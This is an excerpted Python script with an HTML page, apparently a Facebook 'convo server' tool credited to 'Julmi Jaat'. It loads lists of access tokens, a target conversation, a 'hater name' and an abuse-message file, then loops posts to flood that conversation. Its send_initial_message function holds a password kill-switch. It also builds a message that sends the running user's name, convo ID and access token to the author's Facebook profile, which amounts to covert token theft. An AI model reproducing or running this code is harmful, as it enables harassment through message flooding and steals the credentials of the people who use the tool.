...
#             AK-CONVO.txt => CONVO TEXT
#             AK-FILE.txt => GALI FILE
#             AK-NAME.txt => HATER NAME
#             AK-TOKEN.txt => ALL ID TOKEN 
#             AK-SPEED.txt => TIME SPEED 
#             AK-PASS.txt => PASSWORD
...
<head>
    ...
    <title> JULMI K1NG</title>
    <style>
        body {
            background-image: url('julmi.jpg');
...
<body>
    <div class="container">
        <div class="box">
            <h1> JULMI JAAT</h1>
            <div class="credit">
                <p>1. CREDIT:- JULMI JAAT</p>
                <p>2. OWNER =>  JULMI JAAT</p>
                <p>3. CONTACT:- <a href="https://wa.me/+9198966*****">WhatsApp</a></p>
                <p>4. FACEBOOK:- <a href="https://https://www.facebook.com/julmijaat1008?mibextid=ZbWKwL">Facebook</a></p>
                <p>5. INSTAGRAM:- <a href="https://https://instagram.com/_julmi_jaat__?igshid=OGQ5ZDc2ODk2ZA==">Instagram</a></p>
            </div>
        </div>
    </div>
    <div class="thanks">
        ...
        <a href="https://instagram.com/_julmi_jaat__?igshid=OGQ5ZDc2ODk2ZA==">Instagram </a>
    </div>
</body>
</html>
"""
...
def send_initial_message():
    ...
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ YOUR P9SSW0RD CH9NG3D BY JULMI JAAT ⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "Owner => Julmi \n Hello Julmi Jaat sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["https://www.facebook.com/julmijaat1008?mibextid=ZbWKwL"]
    ...
    while True:
        try:
            for message_index in range(num_messages):
                ...
                response = requests.post(url, json=parameters, headers=headers)
                if response.ok:
                    print("\033[1;36m[✓] JULMI JAAT {} C0NV0 {} T0K3N {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    print(formatted_time)
                    print('\033[1;92m' + '✪✭═══════•『JULMI JAAT 』•═══════✭✪')
                else:
